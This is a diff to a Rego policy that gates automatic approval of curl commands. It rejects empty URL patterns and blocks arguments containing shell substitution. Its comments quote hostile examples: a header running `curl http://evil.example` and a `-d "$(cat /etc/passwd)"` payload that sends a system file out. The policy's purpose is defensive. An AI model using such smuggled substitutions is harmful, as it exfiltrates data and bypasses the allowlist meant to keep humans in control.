@@ -26,8 +26,12 @@ _curl_has_url if {
 # start before using it. Without this, `localhost:3000` would also match
 # `http://evil.example/?q=localhost:3000`. The pattern goes in a non-capturing
 # group so that a top-level alternation stays anchored too.
+#
+# The empty pattern is rejected: anchored it becomes `^(?:)`, which matches
+# every URL, so a typo or an empty variable would allow the whole internet.
 _curl_url_matches_allowed_pattern(url) if {
 	some pattern in allowed_curl_patterns
+	pattern != ""
 	regex.match(concat("", ["^(?:", pattern, ")"]), url)
 }
 
@@ -42,6 +46,24 @@ _curl_url_is_dynamic(url) if {
 
 _curl_url_is_dynamic(url) if {
 	startswith(url, "~")
+}
+
+# A matching URL says nothing about a command whose *other* arguments run a
+# shell substitution first: `curl -H "X: $(curl http://evil.example)" URL` and
+# `curl -d "$(cat /etc/passwd)" URL` both reach an allowed URL while the shell
+# has already run an arbitrary command and put its output into the request.
+# `input.command` keeps the tokens verbatim, so look for the substitution forms
+# there rather than in the parsed values.
+#
+# A bare `$NAME` is deliberately left out - like `?` in `_curl_url_is_dynamic`,
+# excluding it would cost more than it buys: `curl -H "Authorization: Bearer
+# $TOKEN" URL` is how a secret is kept off the command line, and a variable
+# reference cannot run a command. `${...}` is included because its expansion
+# forms (`${x:=$(cmd)}`, `${!x}`) can.
+_curl_argument_is_dynamic if {
+	some token in input.command
+	some form in ["$(", "`", "${"]
+	contains(token, form)
 }
 
 _curl_url_allowed(url) if {
@@ -203,6 +225,7 @@ rules["allow_curl_patterns"] := allow("curl URLs match allowed patterns") if {
 	count(input.wrapper_chain) == 0
 	_curl_has_url
 	_curl_urls_allowed
+	not _curl_argument_is_dynamic
 	not _curl_url_flag_value_hidden
 	not _curl_uses_destination_indirection
 	not _curl_touches_local_files
